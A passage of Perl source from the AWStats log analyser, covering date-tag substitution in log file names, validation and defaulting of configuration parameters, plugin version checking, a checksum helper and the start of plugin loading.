	if ($Debug) { debug("Call to Substitute_Tags on $SourceString"); }

	my %MonthNumLibEn = (
		"01", "Jan", "02", "Feb", "03", "Mar", "04", "Apr",
		"05", "May", "06", "Jun", "07", "Jul", "08", "Aug",
		"09", "Sep", "10", "Oct", "11", "Nov", "12", "Dec"
	);

	while ( $SourceString =~ /%([ymdhwYMDHWNSO]+)-(\(\d+\)|\d+)/ ) {

		# Accept tag %xx-dd and %xx-(dd)
		my $timetag     = "$1";
		my $timephase   = quotemeta("$2");
		my $timephasenb = "$2";
		$timephasenb =~ s/[^\d]//g;
		if ($Debug) {
			debug(
" Found a time tag '$timetag' with a phase of '$timephasenb' hour in log file name",
				1
			);
		}

		# Get older time
		my (
			$oldersec,   $oldermin,  $olderhour, $olderday,
			$oldermonth, $olderyear, $olderwday, $olderyday
		  )
		  = localtime( $starttime - ( $timephasenb * 3600 ) );
		my $olderweekofmonth = int( $olderday / 7 );
		my $olderweekofyear  =
		  int(
			( $olderyday - 1 + 6 - ( $olderwday == 0 ? 6 : $olderwday - 1 ) ) /
			  7 ) + 1;
		if ( $olderweekofyear > 53 ) { $olderweekofyear = 1; }
		my $olderdaymod = $olderday % 7;
		$olderwday++;
		my $olderns =
		  Time::Local::timegm( 0, 0, 0, $olderday, $oldermonth, $olderyear );

		if ( $olderdaymod <= $olderwday ) {
			if ( ( $olderwday != 7 ) || ( $olderdaymod != 0 ) ) {
				$olderweekofmonth = $olderweekofmonth + 1;
			}
		}
		if ( $olderdaymod > $olderwday ) {
			$olderweekofmonth = $olderweekofmonth + 2;
		}

		# Change format of time variables
		$olderweekofmonth = "0$olderweekofmonth";
		if ( $olderweekofyear < 10 ) { $olderweekofyear = "0$olderweekofyear"; }
		if ( $olderyear < 100 ) { $olderyear += 2000; }
		else { $olderyear += 1900; }
		my $oldersmallyear = $olderyear;
		$oldersmallyear =~ s/^..//;
		if ( ++$oldermonth < 10 ) { $oldermonth = "0$oldermonth"; }
		if ( $olderday < 10 )     { $olderday   = "0$olderday"; }
		if ( $olderhour < 10 )    { $olderhour  = "0$olderhour"; }
		if ( $oldermin < 10 )     { $oldermin   = "0$oldermin"; }
		if ( $oldersec < 10 )     { $oldersec   = "0$oldersec"; }

		# Replace tag with new value
		if ( $timetag eq 'YYYY' ) {
			$SourceString =~ s/%YYYY-$timephase/$olderyear/ig;
			next;
		}
		if ( $timetag eq 'YY' ) {
			$SourceString =~ s/%YY-$timephase/$oldersmallyear/ig;
			next;
		}
		if ( $timetag eq 'MM' ) {
			$SourceString =~ s/%MM-$timephase/$oldermonth/ig;
			next;
		}
		if ( $timetag eq 'MO' ) {
			$SourceString =~ s/%MO-$timephase/$MonthNumLibEn{$oldermonth}/ig;
			next;
		}
		if ( $timetag eq 'DD' ) {
			$SourceString =~ s/%DD-$timephase/$olderday/ig;
			next;
		}
		if ( $timetag eq 'HH' ) {
			$SourceString =~ s/%HH-$timephase/$olderhour/ig;
			next;
		}
		if ( $timetag eq 'NS' ) {
			$SourceString =~ s/%NS-$timephase/$olderns/ig;
			next;
		}
		if ( $timetag eq 'WM' ) {
			$SourceString =~ s/%WM-$timephase/$olderweekofmonth/g;
			next;
		}
		if ( $timetag eq 'Wm' ) {
			my $olderweekofmonth0 = $olderweekofmonth - 1;
			$SourceString =~ s/%Wm-$timephase/$olderweekofmonth0/g;
			next;
		}
		if ( $timetag eq 'WY' ) {
			$SourceString =~ s/%WY-$timephase/$olderweekofyear/g;
			next;
		}
		if ( $timetag eq 'Wy' ) {
			my $olderweekofyear0 = sprintf( "%02d", $olderweekofyear - 1 );
			$SourceString =~ s/%Wy-$timephase/$olderweekofyear0/g;
			next;
		}
		if ( $timetag eq 'DW' ) {
			$SourceString =~ s/%DW-$timephase/$olderwday/g;
			next;
		}
		if ( $timetag eq 'Dw' ) {
			my $olderwday0 = $olderwday - 1;
			$SourceString =~ s/%Dw-$timephase/$olderwday0/g;
			next;
		}

		# If unknown tag
		error("Unknown tag '\%$timetag' in parameter.");
	}

# Replace %YYYY %YY %MM %DD %HH with current value. Kept for backward compatibility.
	$SourceString =~ s/%YYYY/$nowyear/ig;
	$SourceString =~ s/%YY/$nowsmallyear/ig;
	$SourceString =~ s/%MM/$nowmonth/ig;
	$SourceString =~ s/%MO/$MonthNumLibEn{$nowmonth}/ig;
	$SourceString =~ s/%DD/$nowday/ig;
	$SourceString =~ s/%HH/$nowhour/ig;
	$SourceString =~ s/%NS/$nowns/ig;
	$SourceString =~ s/%WM/$nowweekofmonth/g;
	my $nowweekofmonth0 = $nowweekofmonth - 1;
	$SourceString =~ s/%Wm/$nowweekofmonth0/g;
	$SourceString =~ s/%WY/$nowweekofyear/g;
	my $nowweekofyear0 = $nowweekofyear - 1;
	$SourceString =~ s/%Wy/$nowweekofyear0/g;
	$SourceString =~ s/%DW/$nowwday/g;
	my $nowwday0 = $nowwday - 1;
	$SourceString =~ s/%Dw/$nowwday0/g;

	return $SourceString;
}

#------------------------------------------------------------------------------
# Function:     Check if all parameters are correctly defined. If not set them to default.
# Parameters:	None
# Input:		All global variables
# Output:		Change on some global variables
# Return:		None
#------------------------------------------------------------------------------
sub Check_Config {
	if ($Debug) { debug("Call to Check_Config"); }

	# Show initial values of main parameters before check
	if ($Debug) {
		debug( " LogFile='$LogFile'",           2 );
		debug( " LogType='$LogType'",           2 );
		debug( " LogFormat='$LogFormat'",       2 );
		debug( " LogSeparator='$LogSeparator'", 2 );
		debug( " DNSLookup='$DNSLookup'",       2 );
		debug( " DirData='$DirData'",           2 );
		debug( " DirCgi='$DirCgi'",             2 );
		debug( " DirIcons='$DirIcons'",         2 );
		debug( " NotPageList " .    ( join( ',', keys %NotPageList ) ),    2 );
		debug( " ValidHTTPCodes " . ( join( ',', keys %ValidHTTPCodes ) ), 2 );
		debug( " ValidSMTPCodes " . ( join( ',', keys %ValidSMTPCodes ) ), 2 );
		debug( " UseFramesWhenCGI=$UseFramesWhenCGI",     2 );
		debug( " BuildReportFormat=$BuildReportFormat",   2 );
		debug( " BuildHistoryFormat=$BuildHistoryFormat", 2 );
		debug(
			" URLWithQueryWithOnlyFollowingParameters="
			  . ( join( ',', @URLWithQueryWithOnly ) ),
			2
		);
		debug(
			" URLWithQueryWithoutFollowingParameters="
			  . ( join( ',', @URLWithQueryWithout ) ),
			2
		);
	}

	# Main section
	$LogFile = &Substitute_Tags($LogFile);
	if ( !$LogFile ) {
		error("LogFile parameter is not defined in config/domain file");
	}
	if ( $LogType !~ /[WSMF]/i ) { $LogType = 'W'; }
	$LogFormat =~ s/\\//g;
	if ( !$LogFormat ) {
		error("LogFormat parameter is not defined in config/domain file");
	}
	if ( $LogFormat =~ /^\d$/ && $LogFormat !~ /[1-6]/ ) {
		error(
"LogFormat parameter is wrong in config/domain file. Value is '$LogFormat' (should be 1,2,3,4,5 or a 'personalized AWStats log format string')"
		);
	}
	$LogSeparator ||= "\\s";
	$DirData      ||= '.';
	$DirCgi       ||= '/cgi-bin';
	$DirIcons     ||= '/icon';
	if ( $DNSLookup !~ /[0-2]/ ) {
		error(
"DNSLookup parameter is wrong in config/domain file. Value is '$DNSLookup' (should be 0,1 or 2)"
		);
	}
	if ( !$SiteDomain ) {
		error(
"SiteDomain parameter not defined in your config/domain file. You must edit it for using this version of AWStats."
		);
	}
	if ( $AllowToUpdateStatsFromBrowser !~ /[0-1]/ ) {
		$AllowToUpdateStatsFromBrowser = 0;
	}
	if ( $AllowFullYearView !~ /[0-3]/ ) { $AllowFullYearView = 2; }

	# Optional setup section
	if ( !$SectionsToBeSaved )             { $SectionsToBeSaved   = 'all'; }
	if ( $EnableLockForUpdate !~ /[0-1]/ ) { $EnableLockForUpdate = 0; }
	$DNSStaticCacheFile     ||= 'dnscache.txt';
	$DNSLastUpdateCacheFile ||= 'dnscachelastupdate.txt';
	if ( $DNSStaticCacheFile eq $DNSLastUpdateCacheFile ) {
		error(
"DNSStaticCacheFile and DNSLastUpdateCacheFile must have different values."
		);
	}
	if ( $AllowAccessFromWebToAuthenticatedUsersOnly !~ /[0-1]/ ) {
		$AllowAccessFromWebToAuthenticatedUsersOnly = 0;
	}
	if ( $CreateDirDataIfNotExists !~ /[0-1]/ ) {
		$CreateDirDataIfNotExists = 0;
	}
	if ( $BuildReportFormat !~ /html|xhtml|xml/i ) {
		$BuildReportFormat = 'html';
	}
	if ( $BuildHistoryFormat !~ /text|xml/ ) { $BuildHistoryFormat = 'text'; }
	if ( $SaveDatabaseFilesWithPermissionsForEveryone !~ /[0-1]/ ) {
		$SaveDatabaseFilesWithPermissionsForEveryone = 0;
	}
	if ( $PurgeLogFile !~ /[0-1]/ ) { $PurgeLogFile = 0; }
	if ( $KeepBackupOfHistoricFiles !~ /[0-1]/ ) {
		$KeepBackupOfHistoricFiles = 0;
	}
	$DefaultFile[0] ||= 'index.html';
	if ( $AuthenticatedUsersNotCaseSensitive !~ /[0-1]/ ) {
		$AuthenticatedUsersNotCaseSensitive = 0;
	}
	if ( $URLNotCaseSensitive !~ /[0-1]/ ) { $URLNotCaseSensitive = 0; }
	if ( $URLWithAnchor !~ /[0-1]/ )       { $URLWithAnchor       = 0; }
	$URLQuerySeparators =~ s/\s//g;
	if ( !$URLQuerySeparators )             { $URLQuerySeparators   = '?;'; }
	if ( $URLWithQuery !~ /[0-1]/ )         { $URLWithQuery         = 0; }
	if ( $URLReferrerWithQuery !~ /[0-1]/ ) { $URLReferrerWithQuery = 0; }
	if ( $WarningMessages !~ /[0-1]/ )      { $WarningMessages      = 1; }
	if ( $DebugMessages !~ /[0-1]/ )        { $DebugMessages        = 0; }

	if ( $NbOfLinesForCorruptedLog !~ /^\d+/ || $NbOfLinesForCorruptedLog < 1 )
	{
		$NbOfLinesForCorruptedLog = 50;
	}
	if ( $Expires !~ /^\d+/ )   { $Expires  = 0; }
	if ( $DecodeUA !~ /[0-1]/ ) { $DecodeUA = 0; }
	$MiscTrackerUrl ||= '/js/awstats_misc_tracker.js';

	# Optional accuracy setup section
	if ( $LevelForWormsDetection !~ /^\d+/ )  { $LevelForWormsDetection  = 0; }
	if ( $LevelForRobotsDetection !~ /^\d+/ ) { $LevelForRobotsDetection = 2; }
	if ( $LevelForBrowsersDetection !~ /^\w+/ ) {
		$LevelForBrowsersDetection = 2;
	}    # Can be 'allphones'
	if ( $LevelForOSDetection !~ /^\d+/ )    { $LevelForOSDetection    = 2; }
	if ( $LevelForRefererAnalyze !~ /^\d+/ ) { $LevelForRefererAnalyze = 2; }
	if ( $LevelForFileTypesDetection !~ /^\d+/ ) {
		$LevelForFileTypesDetection = 2;
	}
	if ( $LevelForSearchEnginesDetection !~ /^\d+/ ) {
		$LevelForSearchEnginesDetection = 2;
	}
	if ( $LevelForKeywordsDetection !~ /^\d+/ ) {
		$LevelForKeywordsDetection = 2;
	}

	# Optional extra setup section
	foreach my $extracpt ( 1 .. @ExtraName - 1 ) {
		if ( $ExtraStatTypes[$extracpt] !~ /[PHBL]/ ) {
			$ExtraStatTypes[$extracpt] = 'PHBL';
		}
		if (   $MaxNbOfExtra[$extracpt] !~ /^\d+$/
			|| $MaxNbOfExtra[$extracpt] < 0 )
		{
			$MaxNbOfExtra[$extracpt] = 20;
		}
		if ( $MinHitExtra[$extracpt] !~ /^\d+$/ || $MinHitExtra[$extracpt] < 1 )
		{
			$MinHitExtra[$extracpt] = 1;
		}
		if ( !$ExtraFirstColumnValues[$extracpt] ) {
			error(
"Extra section number $extracpt is defined without ExtraSectionFirstColumnValues$extracpt parameter"
			);
		}
		if ( !$ExtraFirstColumnFormat[$extracpt] ) {
			$ExtraFirstColumnFormat[$extracpt] = '%s';
		}
	}

	# Optional appearance setup section
	if ( $MaxRowsInHTMLOutput !~ /^\d+/ || $MaxRowsInHTMLOutput < 1 ) {
		$MaxRowsInHTMLOutput = 1000;
	}
	if ( $ShowMenu !~ /[01]/ )            { $ShowMenu       = 1; }
	if ( $ShowSummary !~ /[01UVPHB]/ )    { $ShowSummary    = 'UVPHB'; }
	if ( $ShowMonthStats !~ /[01UVPHB]/ ) { $ShowMonthStats = 'UVPHB'; }
	if ( $ShowDaysOfMonthStats !~ /[01VPHB]/ ) {
		$ShowDaysOfMonthStats = 'VPHB';
	}
	if ( $ShowDaysOfWeekStats !~ /[01PHBL]/ ) { $ShowDaysOfWeekStats = 'PHBL'; }
	if ( $ShowHoursStats !~ /[01PHBL]/ )      { $ShowHoursStats      = 'PHBL'; }
	if ( $ShowDomainsStats !~ /[01PHB]/ )     { $ShowDomainsStats    = 'PHB'; }
	if ( $ShowHostsStats !~ /[01PHBL]/ )      { $ShowHostsStats      = 'PHBL'; }

	if ( $ShowAuthenticatedUsers !~ /[01PHBL]/ ) {
		$ShowAuthenticatedUsers = 0;
	}
	if ( $ShowRobotsStats !~ /[01HBL]/ )     { $ShowRobotsStats     = 'HBL'; }
	if ( $ShowWormsStats !~ /[01HBL]/ )      { $ShowWormsStats      = 'HBL'; }
	if ( $ShowEMailSenders !~ /[01HBML]/ )   { $ShowEMailSenders    = 0; }
	if ( $ShowEMailReceivers !~ /[01HBML]/ ) { $ShowEMailReceivers  = 0; }
	if ( $ShowSessionsStats !~ /[01]/ )      { $ShowSessionsStats   = 1; }
	if ( $ShowPagesStats !~ /[01PBEX]/i )    { $ShowPagesStats      = 'PBEX'; }
	if ( $ShowFileTypesStats !~ /[01HBC]/ )  { $ShowFileTypesStats  = 'HB'; }
	if ( $ShowDownloadsStats !~ /[01HB]/ )   { $ShowDownloadsStats  = 'HB';}
	if ( $ShowFileSizesStats !~ /[01]/ )     { $ShowFileSizesStats  = 1; }
	if ( $ShowOSStats !~ /[01]/ )            { $ShowOSStats         = 1; }
	if ( $ShowBrowsersStats !~ /[01]/ )      { $ShowBrowsersStats   = 1; }
	if ( $ShowScreenSizeStats !~ /[01]/ )    { $ShowScreenSizeStats = 0; }
	if ( $ShowOriginStats !~ /[01PH]/ )      { $ShowOriginStats     = 'PH'; }
	if ( $ShowKeyphrasesStats !~ /[01]/ )    { $ShowKeyphrasesStats = 1; }
	if ( $ShowKeywordsStats !~ /[01]/ )      { $ShowKeywordsStats   = 1; }
	if ( $ShowClusterStats !~ /[01PHB]/ )    { $ShowClusterStats    = 0; }
	if ( $ShowMiscStats !~ /[01anjdfrqwp]/ ) { $ShowMiscStats       = 'a'; }
	if ( $ShowHTTPErrorsStats !~ /[01]/ )    { $ShowHTTPErrorsStats = 1; }
	if ( $ShowHTTPErrorsPageDetail !~ /[RH]/ ) { $ShowHTTPErrorsPageDetail = 'R'; }
	if ( $ShowSMTPErrorsStats !~ /[01]/ )    { $ShowSMTPErrorsStats = 0; }
	if ( $AddDataArrayMonthStats !~ /[01]/ ) { $AddDataArrayMonthStats = 1; }

	if ( $AddDataArrayShowDaysOfMonthStats !~ /[01]/ ) {
		$AddDataArrayShowDaysOfMonthStats = 1;
	}
	if ( $AddDataArrayShowDaysOfWeekStats !~ /[01]/ ) {
		$AddDataArrayShowDaysOfWeekStats = 1;
	}
	if ( $AddDataArrayShowHoursStats !~ /[01]/ ) {
		$AddDataArrayShowHoursStats = 1;
	}
	my @maxnboflist = (
		'Domain',           'HostsShown',
		'LoginShown',       'RobotShown',
		'WormsShown',       'PageShown',
		'OsShown',          'BrowsersShown',
		'ScreenSizesShown', 'RefererShown',
		'KeyphrasesShown',  'KeywordsShown',
		'EMailsShown',		'DownloadsShown'
	);
	my @maxnboflistdefaultval =
	  ( 10, 10, 10, 10, 5, 10, 10, 10, 5, 10, 10, 10, 20 );
	foreach my $i ( 0 .. ( @maxnboflist - 1 ) ) {
		if (   !$MaxNbOf{ $maxnboflist[$i] }
			|| $MaxNbOf{ $maxnboflist[$i] } !~ /^\d+$/
			|| $MaxNbOf{ $maxnboflist[$i] } < 1 )
		{
			$MaxNbOf{ $maxnboflist[$i] } = $maxnboflistdefaultval[$i];
		}
	}
	my @minhitlist = (
		'Domain',     'Host',  'Login',     'Robot',
		'Worm',       'File',  'Os',        'Browser',
		'ScreenSize', 'Refer', 'Keyphrase', 'Keyword',
		'EMail',	  'Downloads'
	);
	my @minhitlistdefaultval = ( 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 );
	foreach my $i ( 0 .. ( @minhitlist - 1 ) ) {
		if (   !$MinHit{ $minhitlist[$i] }
			|| $MinHit{ $minhitlist[$i] } !~ /^\d+$/
			|| $MinHit{ $minhitlist[$i] } < 1 )
		{
			$MinHit{ $minhitlist[$i] } = $minhitlistdefaultval[$i];
		}
	}
	if ( $FirstDayOfWeek !~ /[01]/ )   { $FirstDayOfWeek   = 1; }
	if ( $UseFramesWhenCGI !~ /[01]/ ) { $UseFramesWhenCGI = 1; }
	if ( $DetailedReportsOnNewWindows !~ /[012]/ ) {
		$DetailedReportsOnNewWindows = 1;
	}
	if ( $ShowLinksOnUrl !~ /[01]/ ) { $ShowLinksOnUrl = 1; }
	if ( $MaxLengthOfShownURL !~ /^\d+/ || $MaxLengthOfShownURL < 1 ) {
		$MaxLengthOfShownURL = 64;
	}
	if ( $ShowLinksToWhoIs !~ /[01]/ ) { $ShowLinksToWhoIs = 0; }
	$Logo     ||= 'awstats_logo6.svg';
	$LogoLink ||= 'https://www.awstats.org';
	if ( $BarWidth !~ /^\d+/  || $BarWidth < 1 )  { $BarWidth  = 260; }
	if ( $BarHeight !~ /^\d+/ || $BarHeight < 1 ) { $BarHeight = 90; }
	$color_Background =~ s/#//g;
	if ( $color_Background !~ /^[0-9|A-H]+$/i ) {
		$color_Background = 'FFFFFF';
	}
	$color_TableBGTitle =~ s/#//g;

	if ( $color_TableBGTitle !~ /^[0-9|A-H]+$/i ) {
		$color_TableBGTitle = 'CCCCDD';
	}
	$color_TableTitle =~ s/#//g;
	if ( $color_TableTitle !~ /^[0-9|A-H]+$/i ) {
		$color_TableTitle = '000000';
	}
	$color_TableBG =~ s/#//g;
	if ( $color_TableBG !~ /^[0-9|A-H]+$/i ) { $color_TableBG = 'CCCCDD'; }
	$color_TableRowTitle =~ s/#//g;
	if ( $color_TableRowTitle !~ /^[0-9|A-H]+$/i ) {
		$color_TableRowTitle = 'FFFFFF';
	}
	$color_TableBGRowTitle =~ s/#//g;
	if ( $color_TableBGRowTitle !~ /^[0-9|A-H]+$/i ) {
		$color_TableBGRowTitle = 'ECECEC';
	}
	$color_TableBorder =~ s/#//g;
	if ( $color_TableBorder !~ /^[0-9|A-H]+$/i ) {
		$color_TableBorder = 'ECECEC';
	}
	$color_text =~ s/#//g;
	if ( $color_text !~ /^[0-9|A-H]+$/i ) { $color_text = '000000'; }
	$color_textpercent =~ s/#//g;
	if ( $color_textpercent !~ /^[0-9|A-H]+$/i ) {
		$color_textpercent = '606060';
	}
	$color_titletext =~ s/#//g;
	if ( $color_titletext !~ /^[0-9|A-H]+$/i ) { $color_titletext = '000000'; }
	$color_weekend =~ s/#//g;
	if ( $color_weekend !~ /^[0-9|A-H]+$/i ) { $color_weekend = 'EAEAEA'; }
	$color_link =~ s/#//g;
	if ( $color_link !~ /^[0-9|A-H]+$/i ) { $color_link = '0011BB'; }
	$color_hover =~ s/#//g;
	if ( $color_hover !~ /^[0-9|A-H]+$/i ) { $color_hover = '605040'; }
	$color_other =~ s/#//g;
	if ( $color_other !~ /^[0-9|A-H]+$/i ) { $color_other = '666688'; }
	$color_u =~ s/#//g;
	if ( $color_u !~ /^[0-9|A-H]+$/i ) { $color_u = 'FFA060'; }
	$color_v =~ s/#//g;
	if ( $color_v !~ /^[0-9|A-H]+$/i ) { $color_v = 'F4F090'; }
	$color_p =~ s/#//g;
	if ( $color_p !~ /^[0-9|A-H]+$/i ) { $color_p = '4477DD'; }
	$color_h =~ s/#//g;
	if ( $color_h !~ /^[0-9|A-H]+$/i ) { $color_h = '66EEFF'; }
	$color_k =~ s/#//g;
	if ( $color_k !~ /^[0-9|A-H]+$/i ) { $color_k = '2EA495'; }
	$color_s =~ s/#//g;
	if ( $color_s !~ /^[0-9|A-H]+$/i ) { $color_s = '8888DD'; }
	$color_e =~ s/#//g;
	if ( $color_e !~ /^[0-9|A-H]+$/i ) { $color_e = 'CEC2E8'; }
	$color_x =~ s/#//g;
	if ( $color_x !~ /^[0-9|A-H]+$/i ) { $color_x = 'C1B2E2'; }

	# Correct param if default value is asked
	if ( $ShowSummary            eq '1' ) { $ShowSummary            = 'UVPHB'; }
	if ( $ShowMonthStats         eq '1' ) { $ShowMonthStats         = 'UVPHB'; }
	if ( $ShowDaysOfMonthStats   eq '1' ) { $ShowDaysOfMonthStats   = 'VPHB'; }
	if ( $ShowDaysOfWeekStats    eq '1' ) { $ShowDaysOfWeekStats    = 'PHBL'; }
	if ( $ShowHoursStats         eq '1' ) { $ShowHoursStats         = 'PHBL'; }
	if ( $ShowDomainsStats       eq '1' ) { $ShowDomainsStats       = 'PHB'; }
	if ( $ShowHostsStats         eq '1' ) { $ShowHostsStats         = 'PHBL'; }
	if ( $ShowEMailSenders       eq '1' ) { $ShowEMailSenders       = 'HBML'; }
	if ( $ShowEMailReceivers     eq '1' ) { $ShowEMailReceivers     = 'HBML'; }
	if ( $ShowAuthenticatedUsers eq '1' ) { $ShowAuthenticatedUsers = 'PHBL'; }
	if ( $ShowRobotsStats        eq '1' ) { $ShowRobotsStats        = 'HBL'; }
	if ( $ShowWormsStats         eq '1' ) { $ShowWormsStats         = 'HBL'; }
	if ( $ShowPagesStats         eq '1' ) { $ShowPagesStats         = 'PBEX'; }
	if ( $ShowFileTypesStats     eq '1' ) { $ShowFileTypesStats     = 'HB'; }
	if ( $ShowDownloadsStats     eq '1' ) { $ShowDownloadsStats     = 'HB';}
	if ( $ShowOriginStats        eq '1' ) { $ShowOriginStats        = 'PH'; }
	if ( $ShowClusterStats       eq '1' ) { $ShowClusterStats       = 'PHB'; }
	if ( $ShowMiscStats eq '1' ) { $ShowMiscStats = 'anjdfrqwp'; }

# Convert extra sections data into @ExtraConditionType, @ExtraConditionTypeVal...
	foreach my $extranum ( 1 .. @ExtraName - 1 ) {
		my $part = 0;
		foreach my $conditioncouple (
			split( /\s*\|\|\s*/, $ExtraCondition[$extranum] ) )
		{
			my ( $conditiontype, $conditiontypeval ) =
			  split( /[,:]/, $conditioncouple, 2 );
			$ExtraConditionType[$extranum][$part] = $conditiontype;
			if ( $conditiontypeval =~ /^REGEX\[(.*)\]$/i ) {
				$conditiontypeval = $1;
			}

			#else { $conditiontypeval=quotemeta($conditiontypeval); }
			$ExtraConditionTypeVal[$extranum][$part] = qr/$conditiontypeval/i;
			$part++;
		}
		$part = 0;
		foreach my $rowkeycouple (
			split( /\s*\|\|\s*/, $ExtraFirstColumnValues[$extranum] ) )
		{
			my ( $rowkeytype, $rowkeytypeval ) =
			  split( /[,:]/, $rowkeycouple, 2 );
			$ExtraFirstColumnValuesType[$extranum][$part] = $rowkeytype;
			if ( $rowkeytypeval =~ /^REGEX\[(.*)\]$/i ) { $rowkeytypeval = $1; }

			#else { $rowkeytypeval=quotemeta($rowkeytypeval); }
			$ExtraFirstColumnValuesTypeVal[$extranum][$part] =
			  qr/$rowkeytypeval/i;
			$part++;
		}
	}

	# Show definitive value for major parameters
	if ($Debug) {
		debug( " LogFile='$LogFile'",               2 );
		debug( " LogFormat='$LogFormat'",           2 );
		debug( " LogSeparator='$LogSeparator'",     2 );
		debug( " DNSLookup='$DNSLookup'",           2 );
		debug( " DirData='$DirData'",               2 );
		debug( " DirCgi='$DirCgi'",                 2 );
		debug( " DirIcons='$DirIcons'",             2 );
		debug( " SiteDomain='$SiteDomain'",         2 );
		debug( " MiscTrackerUrl='$MiscTrackerUrl'", 2 );
		foreach ( keys %MaxNbOf ) { debug( " MaxNbOf{$_}=$MaxNbOf{$_}", 2 ); }
		foreach ( keys %MinHit )  { debug( " MinHit{$_}=$MinHit{$_}",   2 ); }

		foreach my $extranum ( 1 .. @ExtraName - 1 ) {
			debug(
				" ExtraCodeFilter[$extranum] is array "
				  . join( ',', @{ $ExtraCodeFilter[$extranum] } ),
				2
			);
			debug(
				" ExtraConditionType[$extranum] is array "
				  . join( ',', @{ $ExtraConditionType[$extranum] } ),
				2
			);
			debug(
				" ExtraConditionTypeVal[$extranum] is array "
				  . join( ',', @{ $ExtraConditionTypeVal[$extranum] } ),
				2
			);
			debug(
				" ExtraFirstColumnFunction[$extranum] is array "
				  . join( ',', @{ $ExtraFirstColumnFunction[$extranum] } ),
				2
			);
			debug(
				" ExtraFirstColumnValuesType[$extranum] is array "
				  . join( ',', @{ $ExtraFirstColumnValuesType[$extranum] } ),
				2
			);
			debug(
				" ExtraFirstColumnValuesTypeVal[$extranum] is array "
				  . join( ',', @{ $ExtraFirstColumnValuesTypeVal[$extranum] } ),
				2
			);
		}
	}

# Deny URLWithQueryWithOnlyFollowingParameters and URLWithQueryWithoutFollowingParameters both set
	if ( @URLWithQueryWithOnly && @URLWithQueryWithout ) {
		error(
"URLWithQueryWithOnlyFollowingParameters and URLWithQueryWithoutFollowingParameters can't be both set at the same time"
		);
	}

	# Deny $ShowHTTPErrorsStats and $ShowSMTPErrorsStats both set
	if ( $ShowHTTPErrorsStats && $ShowSMTPErrorsStats ) {
		error(
"ShowHTTPErrorsStats and ShowSMTPErrorsStats can't be both set at the same time"
		);
	}

  # Deny LogFile if contains a pipe and PurgeLogFile || ArchiveLogRecords set on
	if ( ( $PurgeLogFile || $ArchiveLogRecords ) && $LogFile =~ /\|\s*$/ ) {
		error(
"A pipe in log file name is not allowed if PurgeLogFile and ArchiveLogRecords are not set to 0"
		);
	}

	# If not a migrate, check if DirData is OK
	if ( !$MigrateStats && !-d $DirData ) {
		if ($CreateDirDataIfNotExists) {
			if ($Debug) { debug( " Make directory $DirData", 2 ); }
			my $mkdirok = mkdir "$DirData", 0766;
			if ( !$mkdirok ) {
				error(
"$PROG failed to create directory DirData (DirData=\"$DirData\", CreateDirDataIfNotExists=$CreateDirDataIfNotExists)."
				);
			}
		}
		else {
			error(
"AWStats database directory defined in config file by 'DirData' parameter ($DirData) does not exist or is not writable."
			);
		}
	}

	if ( $LogType eq 'S' ) { $NOTSORTEDRECORDTOLERANCE = 1000000; }
}

#------------------------------------------------------------------------------
# Function:     Common function used by init function of plugins
# Parameters:	AWStats version required by plugin
# Input:		$VERSION
# Output:		None
# Return: 		'' if ok, "Error: xxx" if error
#------------------------------------------------------------------------------
sub Check_Plugin_Version {
	my $PluginNeedAWStatsVersion = shift;
	if ( !$PluginNeedAWStatsVersion ) { return 0; }
	$VERSION =~ /^(\d+)\.(\d+)/;
	my $numAWStatsVersion = ( $1 * 1000 ) + $2;
	$PluginNeedAWStatsVersion =~ /^(\d+)\.(\d+)/;
	my $numPluginNeedAWStatsVersion = ( $1 * 1000 ) + $2;
	if ( $numPluginNeedAWStatsVersion > $numAWStatsVersion ) {
		return
"Error: AWStats version $PluginNeedAWStatsVersion or higher is required. Detected $VERSION.";
	}
	return '';
}

#------------------------------------------------------------------------------
# Function:     Return a checksum for an array of string
# Parameters:	Array of string
# Input:		None
# Output:		None
# Return: 		Checksum number
#------------------------------------------------------------------------------
sub CheckSum {
	my $string   = shift;
	my $checksum = 0;

	#	use MD5;
	# 	$checksum = MD5->hexhash($string);
	my $i = 0;
	my $j = 0;
	while ( $i < length($string) ) {
		my $c = substr( $string, $i, 1 );
		$checksum += ( ord($c) << ( 8 * $j ) );
		if ( $j++ > 3 ) { $j = 0; }
		$i++;
	}
	return $checksum;
}

#------------------------------------------------------------------------------
# Function:     Load plugins files
# Parameters:	None
# Input:		$DIR @PluginsToLoad
# Output:		None
# Return: 		None
#------------------------------------------------------------------------------
sub Read_Plugins {

# Check plugin files in common possible directories :
# Windows and standard package:        		"$DIR/plugins" (plugins in same dir than awstats.pl)
# Redhat :                                  "/usr/local/awstats/wwwroot/cgi-bin/plugins"
# Debian package :                    		"/usr/share/awstats/plugins"
	my @PossiblePluginsDir = (
		"$DIR/plugins",
		"/usr/local/awstats/wwwroot/cgi-bin/plugins",
		"/usr/share/awstats/plugins"
	);
	my %DirAddedInINC = ();

#Removed for security reason
#foreach my $key (keys %NoLoadPlugin) { if ($NoLoadPlugin{$key} < 0) { push @PluginsToLoad, $key; } }
	if ($Debug) {
		debug(
			"Call to Read_Plugins with list: " . join( ',', @PluginsToLoad ) );
	}
	foreach my $plugininfo (@PluginsToLoad) {
		my ( $pluginfile, $pluginparam ) = split( /\s+/, $plugininfo, 2 );
		$pluginparam ||=
		  "";    # If split has only on part, pluginparam is not initialized
        $pluginfile =~ s/\.pm$//i;
		$pluginfile =~ /([^\/\\]+)$/;
		$pluginfile = Sanitize($1);     # pluginfile is cleaned from any path for security reasons and from .pm
		my $pluginname = $pluginfile;
		if ( $NoLoadPlugin{$pluginname} && $NoLoadPlugin{$pluginname} > 0 ) {
			if ($Debug) {
				debug(
" Plugin load for '$pluginfile' has been disabled from parameters"
				);
			}
			next;
		}
		if ($pluginname) {
			if ( !$PluginsLoaded{'init'}{"$pluginname"} )
			{                   # Plugin not already loaded
				my %pluginisfor = (
					'timehires'            => 'u',
					'ipv6'                 => 'u',
					'hashfiles'            => 'u',
					'geoipfree'            => 'u',
					'geoip'                => 'ou',
					'geoip6'               => 'ou',
					'geoip2_country'       => 'ou',
					'geoip_region_maxmind' => 'mou',
					'geoip_city_maxmind'   => 'mou',
                    'geoip2_city'          => 'mou',
					'geoip_isp_maxmind'    => 'mou',
					'geoip_org_maxmind'    => 'mou',
					'timezone'             => 'ou',
					'decodeutfkeys'        => 'o',
					'hostinfo'             => 'o',
					'rawlog'               => 'o',
					'userinfo'             => 'o',
					'urlalias'             => 'o',
					'tooltips'             => 'o'
				);
				if ( $pluginisfor{$pluginname} )
				{    # If it's a known plugin, may be we don't need to load it
					 # Do not load "menu handler plugins" if output only and mainleft frame
